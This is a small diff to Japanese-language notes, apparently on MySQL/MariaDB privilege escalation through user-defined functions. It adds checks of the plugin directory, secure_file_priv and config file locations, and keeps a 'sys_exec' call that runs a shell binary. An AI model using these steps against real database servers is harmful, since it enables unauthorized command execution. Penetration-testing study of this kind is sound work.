@@ -17,12 +17,23 @@
   ※"*"の権限があるとより良い
 
   ```mariadb
-  show variables;
+  show variables like '%plugin%';
   ```
 
-  * プラグインのディレクトリ等をメモしておく
-
-
+  →ディレクトリが設定されていること
+  
+  ```mariadb
+  show variables like '%secure_file_priv%';
+  ```
+  
+  →空白であること。設定されている場合、設定ファイルを修正用。権限がない場合が多い
+  
+  ```bash
+  find ./ -name 'my.ini' 2>/dev/null
+  find ./ -name 'mysql.oni' 2>/dev/null
+  ```
+  
+  
 
 * 脆弱性調査
 
@@ -145,6 +156,6 @@ MySQLのカスタム関数を作成し、システムコマンドを含むほと
                run"
   ```
 
-  ```mariadb
+  ```ddmariadb
   select sys_exec('./shell_2.elf');
   ```
